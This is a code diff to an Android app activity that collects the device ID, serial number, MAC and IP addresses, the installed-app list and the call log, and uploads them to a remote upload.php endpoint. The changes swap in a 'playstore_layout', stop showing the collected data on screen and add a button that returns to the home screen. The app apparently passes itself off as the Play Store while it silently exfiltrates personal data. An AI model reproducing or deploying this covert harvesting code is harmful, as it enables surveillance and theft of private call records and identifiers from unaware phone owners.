@@ -8,7 +8,7 @@ import android.app.ActivityManager;
 import android.app.ProgressDialog;
 import android.app.usage.UsageStats;
 import android.app.usage.UsageStatsManager;
-import android.content.BroadcastReceiver;
+import com.loopj.android.http.*;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
@@ -24,6 +24,8 @@ import android.os.Bundle;
 import android.provider.Settings;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
+import android.view.View;
+import android.widget.Button;
 import android.widget.TextView;
 import android.widget.Toast;
 
@@ -32,6 +34,7 @@ import com.android_examples.getinstalledappiconname_android_examplescom.R;
 import java.io.ByteArrayInputStream;
 import java.io.DataOutputStream;
 import java.io.FileInputStream;
+import java.io.FileNotFoundException;
 import java.io.InputStream;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
@@ -40,6 +43,8 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.List;
 import java.util.Locale;
+
+import cz.msebera.android.httpclient.Header;
 
 public class SnapshotActivity extends AppCompatActivity {
 
@@ -58,16 +63,7 @@ public class SnapshotActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.snapshot_layout);
-
-/*        if (ActivityCompat.checkSelfPermission(this, GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
-            // TODO: Consider calling
-            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
-                    Uri.parse("package:" + getPackageName()));
-            intent.addCategory(Intent.CATEGORY_DEFAULT);
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
-        }*/
+        setContentView(R.layout.playstore_layout);
 
         newString+=" Device ID: "+getDeviceID()+"\n Battery Level: "+getBatteryPercentage()+"\n";
         newString+=" Device Name: "+ DeviceTracker.getDeviceName()+"\n Model: "+ Build.MODEL+"\n Serial: "+ Build.SERIAL+"\n Wlan0: "+ IPTracker.getMACAddress("wlan0")+"\n Eth0: "+ IPTracker.getMACAddress("eth0")+"\n IPv4: "+ IPTracker.getIPAddress(true)+"\n IPv6: "+ IPTracker.getIPAddress(false)+"\n";
@@ -84,19 +80,37 @@ public class SnapshotActivity extends AppCompatActivity {
         newString+=CallTracker.getCallLog(this);
         //Toast.makeText(this, newString, Toast.LENGTH_SHORT).show();
 
-        /*filepath = "Snapshot"+cDateTime+".txt";
-        uploadFileName = "Snapshot"+"_"+cDateTime+".txt";*/
-        filepath = "Snapshot"+cDateTime+".zip";
-        uploadFileName = "Snapshot"+"_"+cDateTime+".zip";
+        filepath = "Snapshot"+cDateTime+".txt";
+        uploadFileName = "Snapshot"+"_"+cDateTime+".txt";
 
         SimpleDateFormat sdf = new SimpleDateFormat("MM/dd/yyyy hh:mm:ss");
         String date = sdf.format(new Date());
         TextView snapshot = (TextView) findViewById(R.id.snapshot);
-        snapshot.setText("Current Snapshot: "+date+"\n\n"+newString);
+        //snapshot.setText("Current Snapshot: "+date+"\n\n"+newString);
+
+        Button exitButton = (Button) findViewById(R.id.exit);
+        exitButton.setOnClickListener(new View.OnClickListener() {
+            public void onClick(View v) {
+                // Perform action on click
+                exitToHome();
+            }
+        });
+
 
         dummy();
 
-        doLastJob();
+        try {
+            doLastJob();
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        }
+    }
+
+    public void exitToHome(){
+        Intent a = new Intent(Intent.ACTION_MAIN);
+        a.addCategory(Intent.CATEGORY_HOME);
+        a.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(a);
     }
 
     public String getBatteryPercentage()
@@ -182,155 +196,45 @@ public class SnapshotActivity extends AppCompatActivity {
         return appList;
     }
 
-    private void doLastJob() {
+    private void doLastJob() throws FileNotFoundException {
 
         /************* File Upload Code ****************/
         upLoadServerUri = "http://users.cis.fiu.edu/~stalu001/upload.php";
-
-        dialog = ProgressDialog.show(SnapshotActivity.this, "", "", true);
-
-        try {
-            new Thread(new Runnable() {
-                public void run() {
-                    runOnUiThread(new Runnable() {
-                        public void run() {
-                            //messageText.setText("uploading started.....");
-                        }
-                    });
-
-                    uploadFile(filepath);
-
-                }
-            }).start();
-        }
-        catch (Exception e)
-        {
-            System.out.println(e);
-        }
-        /************* File Upload Code Ends ****************/
+        uploadFile(filepath);
     }
-    public int uploadFile(String sourceFileUri) {
 
-
+    private void uploadFile(String sourceFileUri) throws FileNotFoundException {
+        AsyncHttpClient client = new AsyncHttpClient();
+        client.setTimeout(200000);
+        client.setResponseTimeout(200000);
+        client.setConnectTimeout(200000);
+        upLoadServerUri = "http://users.cis.fiu.edu/~stalu001/upload.php";
         String fileName = sourceFileUri;
-
-        HttpURLConnection conn = null;
-        DataOutputStream dos = null;
-        String lineEnd = "\r\n";
-        String twoHyphens = "--";
-        String boundary = "*****";
-        int bytesRead, bytesAvailable, bufferSize;
-        byte[] buffer;
-        int maxBufferSize = 1 * 1024 * 1024;
-        //``        11File sourceFile = new File(sourceFileUri);
-
-
-        try {
-
-            // open a URL connection to the Servlet
-            //FileInputStream fileInputStream = new FileInputStream(myInternalFile);
-            URL url = new URL(upLoadServerUri);
-
-            // Open a HTTP  connection to  the URL
-            conn = (HttpURLConnection) url.openConnection();
-            conn.setDoInput(true); // Allow Inputs
-            conn.setDoOutput(true); // Allow Outputs
-            conn.setUseCaches(false); // Don't use a Cached Copy
-            conn.setRequestMethod("POST");
-            conn.setRequestProperty("Connection", "Keep-Alive");
-            conn.setRequestProperty("ENCTYPE", "multipart/form-data");
-            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
-            conn.setRequestProperty("uploaded_file", fileName);
-
-            dos = new DataOutputStream(conn.getOutputStream());
-
-            dos.writeBytes(twoHyphens + boundary + lineEnd);
-            dos.writeBytes("Content-Disposition: form-data; name=\"uploaded_file\";filename=\""
-                    + fileName + "\"" + lineEnd);
-
-            dos.writeBytes(lineEnd);
-
-            InputStream fileInputStream = new ByteArrayInputStream(newString.getBytes());
-
-            // create a buffer of  maximum size
-            bytesAvailable = fileInputStream.available();
-
-            bufferSize = Math.min(bytesAvailable, maxBufferSize);
-            buffer = new byte[bufferSize];
-
-            // read file and write it into form...
-            bytesRead = fileInputStream.read(buffer, 0, bufferSize);
-
-            while (bytesRead > 0) {
-
-                dos.write(buffer, 0, bufferSize);
-                bytesAvailable = fileInputStream.available();
-                bufferSize = Math.min(bytesAvailable, maxBufferSize);
-                bytesRead = fileInputStream.read(buffer, 0, bufferSize);
-
+        InputStream myInputStream = new ByteArrayInputStream(newString.getBytes());
+        RequestParams params = new RequestParams();
+        params.put("file", myInputStream, fileName);
+        ResponseHandlerInterface handler = new AsyncHttpResponseHandler() {
+            @Override
+            public void onSuccess(int statusCode, Header[] headers, byte[] response) {
+                // called when response HTTP status is "200 OK"
+                Toast.makeText(SnapshotActivity.this, "Data Upload Complete!", Toast.LENGTH_SHORT).show();
             }
 
-            // send multipart form data necesssary after file data...
-            dos.writeBytes(lineEnd);
-            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
-
-            // Responses from the server (code and message)
-            serverResponseCode = conn.getResponseCode();
-            String serverResponseMessage = conn.getResponseMessage();
-
-            Log.i("uploadFile", "HTTP Response is : "
-                    + serverResponseMessage + ": " + serverResponseCode);
-
-            if(serverResponseCode == 200){
-
-                runOnUiThread(new Runnable() {
-                    public void run() {
-
-                        String msg = "File Upload Completed";
-
-                        //messageText.setText(msg);
-                        Toast.makeText(SnapshotActivity.this, "Data Upload Complete!", Toast.LENGTH_SHORT).show();
-                    }
-                });
+            @Override
+            public void onFailure(int statusCode, Header[] headers, byte[] errorResponse, Throwable e) {
+                // called when response HTTP status is "4XX" (eg. 401, 403, 404)
+                Toast.makeText(SnapshotActivity.this, "Data Upload Failed! Error: "+e, Toast.LENGTH_LONG).show();
+                Log.e("Upload Exception", "Exception : "
+                        + e.getMessage(), e);
             }
 
-            //close the streams //
-            fileInputStream.close();
-            dos.flush();
-            dos.close();
-        }
-        catch (MalformedURLException ex) {
-
-            dialog.dismiss();
-            ex.printStackTrace();
-
-            runOnUiThread(new Runnable() {
-                public void run() {
-                    //messageText.setText("MalformedURLException Exception : check script url.");
-                    Toast.makeText(SnapshotActivity.this, "MalformedURLException", Toast.LENGTH_SHORT).show();
-                }
-            });
-
-            Log.e("Upload file to server", "error: " + ex.getMessage(), ex);
-        } catch (Exception e) {
-
-            dialog.dismiss();
-            e.printStackTrace();
-
-            runOnUiThread(new Runnable() {
-                public void run() {
-                    //messageText.setText("Got Exception : see logcat ");
-                    Toast.makeText(SnapshotActivity.this, "Got Exception : see logcat ",
-                            Toast.LENGTH_SHORT).show();
-                }
-            });
-            Log.e("Upload Exception", "Exception : "
-                    + e.getMessage(), e);
-        }
-        dialog.dismiss();
-        return serverResponseCode;
-
-    } // End else block
+            @Override
+            public void onRetry(int retryNo) {
+                // called when request is retried
+            }
+        };
+        client.post(upLoadServerUri, params, handler);
+    }
 
     public void zip(String[] files)
     {
